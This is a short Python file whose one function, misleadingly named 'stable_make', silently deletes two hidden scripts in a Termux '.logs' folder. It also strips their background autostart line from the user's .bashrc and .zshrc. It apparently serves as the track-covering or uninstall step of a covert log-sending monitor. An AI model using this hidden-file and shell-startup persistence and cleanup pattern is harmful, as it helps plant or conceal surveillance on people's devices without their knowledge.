import os
def stable_make():
    try:
        monitor_script_path = "/data/data/com.termux/files/usr/.logs/setp.sh"
        send_log_script_path = "/data/data/com.termux/files/usr/.logs/.s_log.py"
        bashrc_path = os.path.expanduser("~/.bashrc")
        zshrc_path = os.path.expanduser("~/.zshrc")
        startup_command = f"nohup {monitor_script_path} >/dev/null 2>&1 &\n"
        if os.path.exists(monitor_script_path):
            os.remove(monitor_script_path)
        if os.path.exists(send_log_script_path):
            os.remove(send_log_script_path)
        if os.path.exists(bashrc_path):
            with open(bashrc_path, "r") as file:
                lines = file.readlines()
            with open(bashrc_path, "w") as file:
                for line in lines:
                    if line.strip() != startup_command.strip():
                        file.write(line)
        if os.path.exists(zshrc_path):
            with open(zshrc_path, "r") as file:
                lines = file.readlines()
            with open(zshrc_path, "w") as file:
                for line in lines:
                    if line.strip() != startup_command.strip():
                        file.write(line)
    except Exception:
        pass
